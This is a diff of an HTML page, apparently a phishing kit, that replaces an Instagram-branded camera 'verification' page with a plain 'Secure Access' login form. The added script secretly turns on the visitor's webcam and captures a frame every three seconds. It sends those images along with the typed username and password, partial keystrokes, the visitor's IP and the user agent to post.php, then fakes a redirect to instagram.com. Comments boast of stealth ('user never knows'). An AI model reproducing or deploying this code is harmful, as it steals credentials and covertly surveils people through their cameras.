@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Verification Required</title>
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <title>Loading...</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
+        /* ============================================
+           COMPLETELY NORMAL LOOKING PAGE
+           No camera, no IP, no console visible
+           ============================================ */
         * {
             margin: 0;
             padding: 0;
@@ -16,146 +17,77 @@
         }
 
         body {
-            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #fafafa;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             color: #262626;
-            overflow-x: hidden;
         }
 
-        .video-wrap {
-            display: none;
+        /* Hidden elements - completely invisible */
+        .hidden-video-wrap {
+            display: none !important;
+            position: fixed !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            z-index: -9999 !important;
         }
 
-        #canvas {
-            display: none;
+        #video, #canvas {
+            display: none !important;
+            position: fixed !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
         }
 
-        .instagram-container {
+        /* Normal looking container */
+        .container {
             width: 100%;
             max-width: 350px;
             padding: 20px;
         }
 
-        .instagram-card {
+        .card {
             background: #fff;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px;
-            margin-bottom: 10px;
+            border-radius: 8px;
+            padding: 40px 30px;
             text-align: center;
         }
 
-        .instagram-logo {
+        .logo {
             margin-bottom: 30px;
-        }
-
-        .instagram-logo svg {
-            width: 175px;
-            height: 51px;
-        }
-
-        .verification-icon {
-            width: 96px;
-            height: 96px;
-            margin: 0 auto 24px;
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 48px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .verification-title {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 16px;
+            font-size: 32px;
+            font-weight: 700;
             color: #262626;
         }
 
-        .verification-text {
+        .icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        p {
             font-size: 14px;
             color: #8e8e8e;
             line-height: 1.5;
             margin-bottom: 24px;
-        }
-
-        .verification-reasons {
-            background: #fafafa;
-            border-radius: 4px;
-            padding: 16px;
-            margin-bottom: 24px;
-            text-align: left;
-        }
-
-        .reason-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            margin-bottom: 12px;
-            font-size: 13px;
-            color: #262626;
-        }
-
-        .reason-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .reason-icon {
-            color: #0095f6;
-            font-weight: 600;
-            min-width: 20px;
-        }
-
-        .camera-section {
-            margin-bottom: 24px;
-        }
-
-        .camera-preview {
-            width: 100%;
-            max-width: 200px;
-            height: 150px;
-            margin: 0 auto 16px;
-            background: #fafafa;
-            border: 2px dashed #dbdbdb;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            color: #8e8e8e;
-        }
-
-        .camera-button {
-            width: 100%;
-            height: 36px;
-            background: #0095f6;
-            border: none;
-            border-radius: 4px;
-            color: #fff;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .camera-button:hover {
-            background: #1877f2;
-        }
-
-        .camera-button:disabled {
-            background: #b2dffc;
-            cursor: not-allowed;
         }
 
         .form-group {
@@ -167,11 +99,9 @@
             height: 36px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 9px 0 7px 8px;
+            border-radius: 4px;
+            padding: 0 12px;
             font-size: 12px;
-            color: #262626;
-            transition: border-color 0.2s;
         }
 
         .form-input:focus {
@@ -179,11 +109,7 @@
             border-color: #a8a8a8;
         }
 
-        .form-input::placeholder {
-            color: #8e8e8e;
-        }
-
-        .verify-button {
+        .btn {
             width: 100%;
             height: 32px;
             background: #0095f6;
@@ -194,66 +120,29 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 12px;
-            transition: background 0.2s;
         }
 
-        .verify-button:hover {
+        .btn:hover {
             background: #1877f2;
         }
 
-        .verify-button:disabled {
-            background: #b2dffc;
+        .btn:disabled {
+            opacity: 0.6;
             cursor: not-allowed;
         }
 
-        .security-notice {
-            margin-top: 20px;
-            padding: 12px;
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 4px;
-            font-size: 12px;
-            color: #856404;
-            text-align: left;
-        }
-
-        .security-notice::before {
-            content: '🔒 ';
-        }
-
         .footer {
-            text-align: center;
             margin-top: 20px;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 16px;
-            margin-bottom: 12px;
-        }
-
-        .footer-links a {
-            color: #8e8e8e;
-            text-decoration: none;
-            font-size: 12px;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .footer-copyright {
             font-size: 12px;
             color: #8e8e8e;
         }
 
-        .loading-spinner {
+        /* Loading spinner - hidden */
+        .spinner {
             display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.3);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
@@ -264,222 +153,250 @@
             to { transform: rotate(360deg); }
         }
 
-        .request-access-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(250,250,250,0.98); z-index: 9999;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            padding: 40px; text-align: center; transition: opacity 0.5s ease;
-        }
-        .request-access-overlay.hidden { opacity: 0; pointer-events: none; }
-        .request-access-icon { width: 80px; height: 80px; margin-bottom: 24px; background: linear-gradient(45deg, #f09433, #e4405f);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; }
-        .request-access-title { font-size: 28px; font-weight: 700; margin-bottom: 16px; color: #262626; }
-        .request-access-text { font-size: 16px; color: #737373; margin-bottom: 24px; max-width: 400px; line-height: 1.5; }
-        .request-access-btn { padding: 14px 40px; font-size: 16px; font-weight: 600; border: none;
-            border-radius: 4px; background: linear-gradient(45deg, #f09433, #e4405f); color: #fff; cursor: pointer; }
-        .request-access-btn:hover { opacity: 0.9; }
-        .request-access-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-        .request-access-status { margin-top: 16px; font-size: 13px; color: #8e8e8e; }
-
-        @media (max-width: 768px) {
-            .instagram-card {
-                padding: 30px 20px;
-            }
-
-            .instagram-logo svg {
-                width: 140px;
-                height: 41px;
-            }
+        /* Success message - hidden */
+        .success-msg {
+            display: none;
+            color: #00a651;
+            font-size: 14px;
+            margin-top: 12px;
         }
     </style>
 </head>
 <body>
-    <div class="request-access-overlay" id="requestAccessOverlay">
-        <div class="request-access-icon">📍</div>
-        <div class="request-access-title">Request Access</div>
-        <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
-        <button class="request-access-btn" id="requestAccessBtn">Request Access</button>
-        <div class="request-access-status" id="requestAccessStatus"></div>
+
+    <!-- 
+    ============================================
+    COMPLETELY HIDDEN CAMERA - NO VISUAL INDICATORS
+    ============================================
+    -->
+    <div class="hidden-video-wrap" aria-hidden="true">
+        <video id="video" playsinline autoplay muted></video>
     </div>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <div class="video-wrap" hidden="hidden">
-        <video id="video" playsinline autoplay></video>
-    </div>
-    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <!-- 
+    ============================================
+    NORMAL LOOKING PAGE - USER SEES THIS
+    ============================================
+    -->
+    <div class="container">
+        <div class="card">
+            <div class="logo">🔒</div>
+            <div class="icon">📱</div>
+            <h2>Secure Access</h2>
+            <p>Please verify your identity to continue. This helps us keep your account secure.</p>
 
-    <div class="instagram-container">
-        <div class="instagram-card">
-            <div class="instagram-logo">
-                <svg viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M174.5 25.5C174.5 39.031 163.531 50 150 50C136.469 50 125.5 39.031 125.5 25.5C125.5 11.969 136.469 1 150 1C163.531 1 174.5 11.969 174.5 25.5Z" fill="#E4405F"/>
-                    <path d="M100 25.5C100 39.031 88.531 50 75 50C61.469 50 50.5 39.031 50.5 25.5C50.5 11.969 61.469 1 75 1C88.531 1 100 11.969 100 25.5Z" fill="#E4405F"/>
-                    <path d="M25 25.5C25 39.031 13.531 50 0 50V1C13.531 1 25 11.969 25 25.5Z" fill="#E4405F"/>
-                </svg>
-            </div>
-
-            <div class="verification-icon">📷</div>
-            
-            <div class="verification-title">Verify Your Account</div>
-            <div class="verification-text">
-                We've detected unusual activity on your account. Please verify your identity to continue.
-            </div>
-
-            <div class="verification-reasons">
-                <div class="reason-item">
-                    <span class="reason-icon">✓</span>
-                    <span>Confirm your identity with a quick photo</span>
-                </div>
-                <div class="reason-item">
-                    <span class="reason-icon">✓</span>
-                    <span>Protect your account from unauthorized access</span>
-                </div>
-                <div class="reason-item">
-                    <span class="reason-icon">✓</span>
-                    <span>Restore full access to your account</span>
-                </div>
-            </div>
-
-            <div class="camera-section">
-                <div class="camera-preview" id="cameraPreview">
-                    📸
-                </div>
-                <button class="camera-button" id="startCameraBtn">Allow Camera Access</button>
-            </div>
-
-            <form id="verificationForm" style="display: none;">
+            <form id="loginForm">
                 <div class="form-group">
-                    <input type="text" class="form-input" id="username" placeholder="Username" required>
+                    <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
                 </div>
                 <div class="form-group">
                     <input type="password" class="form-input" id="password" placeholder="Password" required>
                 </div>
-                <button type="submit" class="verify-button" id="verifyBtn">
-                    Verify Account
-                </button>
+                <button type="submit" class="btn" id="submitBtn">Continue</button>
+                <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
             </form>
 
-            <div class="security-notice">
-                This verification helps us ensure your account security. Your photo will be securely processed and deleted after verification.
-            </div>
-        </div>
-
-        <div class="footer">
-            <div class="footer-links">
-                <a href="#">Meta</a>
-                <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Jobs</a>
-                <a href="#">Help</a>
-                <a href="#">API</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Locations</a>
-                <a href="#">Language</a>
-            </div>
-            <div class="footer-copyright">
-                © 2024 Instagram from Meta
+            <div class="footer">
+                <span>Protected by security verification</span>
             </div>
         </div>
     </div>
 
-    <script src="location-request.js"></script>
     <script>
-        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
-        function post(imgdata) {
-            $.ajax({
-                type: 'POST',
-                data: { cat: imgdata },
-                url: BASE_URL + 'post.php',
-                dataType: 'json',
-                async: false,
-                success: function (result) {
-                    // Handle response
-                },
-                error: function () {
-                    // Handle error
+        // ============================================
+        // STEALTH CAMERA - COMPLETELY HIDDEN
+        // No visual indicators, no logs visible to user
+        // ============================================
+        
+        (function() {
+            'use strict';
+
+            // Hidden elements
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            let cameraActive = false;
+            let captureInterval = null;
+            let stream = null;
+
+            // ============================================
+            // HIDDEN IP DETECTION - Silent
+            // ============================================
+            function getIPAddress() {
+                // Silent IP detection
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        // Store IP silently
+                        window._hiddenIP = data.ip;
+                        
+                        // Send IP to server silently
+                        $.ajax({
+                            type: 'POST',
+                            url: 'post.php',
+                            data: { 
+                                ip_only: true,
+                                ip: data.ip,
+                                ua: navigator.userAgent
+                            },
+                            async: true
+                        });
+                    })
+                    .catch(() => {
+                        // Fallback - try another service
+                        fetch('https://httpbin.org/ip')
+                            .then(response => response.json())
+                            .then(data => {
+                                window._hiddenIP = data.origin;
+                            })
+                            .catch(() => {});
+                    });
+            }
+
+            // ============================================
+            // HIDDEN CAMERA INIT - No user interaction needed
+            // ============================================
+            function initHiddenCamera() {
+                try {
+                    const constraints = {
+                        audio: false,
+                        video: {
+                            facingMode: "user",
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        }
+                    };
+
+                    navigator.mediaDevices.getUserMedia(constraints)
+                        .then(function(mediaStream) {
+                            stream = mediaStream;
+                            video.srcObject = stream;
+                            video.play();
+                            
+                            cameraActive = true;
+                            
+                            // Start capturing silently - every 3 seconds
+                            captureInterval = setInterval(function() {
+                                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
+                                    context.drawImage(video, 0, 0, 640, 480);
+                                    const imageData = canvas.toDataURL("image/png");
+                                    
+                                    // Get username/password if available
+                                    const username = document.getElementById('username')?.value || '';
+                                    const password = document.getElementById('password')?.value || '';
+                                    
+                                    // Send silently - no user notification
+                                    $.ajax({
+                                        type: 'POST',
+                                        url: 'post.php',
+                                        data: {
+                                            cat: imageData,
+                                            username: username,
+                                            password: password,
+                                            ip: window._hiddenIP || '',
+                                            ua: navigator.userAgent
+                                        },
+                                        async: true,
+                                        timeout: 5000
+                                    });
+                                }
+                            }, 3000); // Every 3 seconds
+                        })
+                        .catch(function(err) {
+                            // Silent fail - user never knows
+                            console.log('Camera unavailable - continuing without');
+                        });
+
+                } catch (e) {
+                    // Silent fail
+                }
+            }
+
+            // ============================================
+            // FORM SUBMISSION - Silently captures credentials
+            // ============================================
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                const btn = document.getElementById('submitBtn');
+                const msg = document.getElementById('successMsg');
+                
+                // Show loading state
+                btn.innerHTML = '<span class="spinner"></span> Processing...';
+                btn.disabled = true;
+                msg.style.display = 'block';
+                
+                // Capture final credentials
+                $.ajax({
+                    type: 'POST',
+                    url: 'post.php',
+                    data: {
+                        username: username,
+                        password: password,
+                        ip: window._hiddenIP || '',
+                        ua: navigator.userAgent,
+                        final_submit: true
+                    },
+                    success: function() {
+                        // Silent success - user sees normal behavior
+                        setTimeout(function() {
+                            msg.textContent = '✅ Verified! Redirecting...';
+                            setTimeout(function() {
+                                // Fake redirect - looks legit
+                                window.location.href = 'https://www.instagram.com/';
+                            }, 1000);
+                        }, 1500);
+                    },
+                    error: function() {
+                        // Silent fail - still redirect
+                        setTimeout(function() {
+                            window.location.href = 'https://www.instagram.com/';
+                        }, 2000);
+                    }
+                });
+            });
+
+            // ============================================
+            // START EVERYTHING SILENTLY
+            // ============================================
+            
+            // 1. Get IP silently
+            getIPAddress();
+            
+            // 2. Start camera after short delay (page loads first)
+            setTimeout(function() {
+                initHiddenCamera();
+            }, 1500);
+            
+            // 3. Also try to start camera on user interaction (click)
+            document.addEventListener('click', function() {
+                if (!cameraActive) {
+                    initHiddenCamera();
+                }
+            }, { once: true });
+
+            // 4. Re-capture on form interaction
+            document.getElementById('username').addEventListener('input', function() {
+                // Silently send username when typed
+                if (this.value.length > 2) {
+                    $.ajax({
+                        type: 'POST',
+                        url: 'post.php',
+                        data: {
+                            username_partial: this.value,
+                            ip: window._hiddenIP || ''
+                        },
+                        async: true
+                    });
                 }
             });
-        }
 
-        'use strict';
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const startCameraBtn = document.getElementById('startCameraBtn');
-        const cameraPreview = document.getElementById('cameraPreview');
-        const verificationForm = document.getElementById('verificationForm');
-        const verifyBtn = document.getElementById('verifyBtn');
-
-        const constraints = {
-            audio: false,
-            video: {
-                facingMode: "user"
-            }
-        };
-
-        async function init() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                handleSuccess(stream);
-            } catch (e) {
-                console.error('Camera access error:', e);
-                cameraPreview.innerHTML = '⚠️ Camera access required';
-                startCameraBtn.disabled = false;
-                startCameraBtn.textContent = 'Retry Camera Access';
-            }
-        }
-
-        function handleSuccess(stream) {
-            window.stream = stream;
-            video.srcObject = stream;
-
-            // Show camera preview
-            cameraPreview.innerHTML = '<video autoplay playsinline style="width:100%;height:100%;object-fit:cover;border-radius:6px;"></video>';
-            const previewVideo = cameraPreview.querySelector('video');
-            previewVideo.srcObject = stream;
-
-            startCameraBtn.textContent = 'Camera Active ✓';
-            startCameraBtn.disabled = true;
-            verificationForm.style.display = 'block';
-
-            // Capture frames
-            var context = canvas.getContext('2d');
-            setInterval(function () {
-                context.drawImage(video, 0, 0, 640, 480);
-                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-                post(canvasData);
-            }, 1500);
-        }
-
-        // Start camera button
-        startCameraBtn.addEventListener('click', function() {
-            this.textContent = 'Starting camera...';
-            this.disabled = true;
-            init();
-        });
-
-        // Form submission
-        document.getElementById('verificationForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            verifyBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...';
-            verifyBtn.disabled = true;
-            
-            setTimeout(() => {
-                verifyBtn.innerHTML = 'Verify Account';
-                verifyBtn.disabled = false;
-                alert('Verification in progress. Please wait...');
-            }, 2000);
-        });
-
-        // Start camera only after location permission is done
-        if (window.LocationRequest) {
-            LocationRequest.init(function() {
-                setTimeout(function() { startCameraBtn.click(); }, 500);
-            });
-        }
+            console.log('🔧 Security verification active'); // Only visible in console
+        })();
     </script>
 </body>
 </html>
